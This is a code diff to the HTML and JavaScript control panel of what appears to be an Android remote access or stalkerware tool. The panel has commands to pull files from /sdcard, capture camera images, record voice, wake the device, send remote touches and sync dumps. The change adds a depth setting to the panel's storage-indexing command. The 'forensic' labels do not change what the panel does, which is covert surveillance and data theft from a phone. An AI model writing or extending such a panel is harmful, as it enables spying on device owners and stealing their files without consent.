@@ -248,8 +248,8 @@
                     </div>
                 </div>
                 <div class="cmd-row"><label class="cmd-label">Forensic File Pull</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('PULL_FILE')">?</button><input type="text" id="val-pull" placeholder="/sdcard/Download/file.jpg"><button class="btn" onclick="sendCmd('PULL_FILE')">Fetch</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Storage Indexer (Depth)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_SKELETON')">?</button><input type="number" id="val-skeleton" value="5" placeholder="Depth" style="width:80px"><button class="btn" onclick="sendCmd('GET_SKELETON')">Index</button></div></div>
                 <div class="cmd-grid" style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
-                    <button class="btn" onclick="sendCmd('GET_SKELETON')">Index Storage</button>
                     <button class="btn" onclick="sendCmd('GET_LOGS')">Diag Logs</button>
                     <button class="btn" onclick="sendCmd('UPLOAD_DUMPS')">Sync Dumps</button>
                     <button class="btn" onclick="sendCmd('GET_VAULT_SIZE')">Vault Size</button>
@@ -436,6 +436,8 @@
                         content = `${document.getElementById('cam-side').value}|${document.getElementById('cam-count').value}`; break;
                     case 'RECORD_VOICE':
                         content = document.getElementById('mic-dur').value; break;
+                    case 'GET_SKELETON':
+                        content = document.getElementById('val-skeleton').value || '5'; break;
                     case 'WAKE':
                         content = document.getElementById('val-wake').value; break;
                     case 'REMOTE_TOUCH':
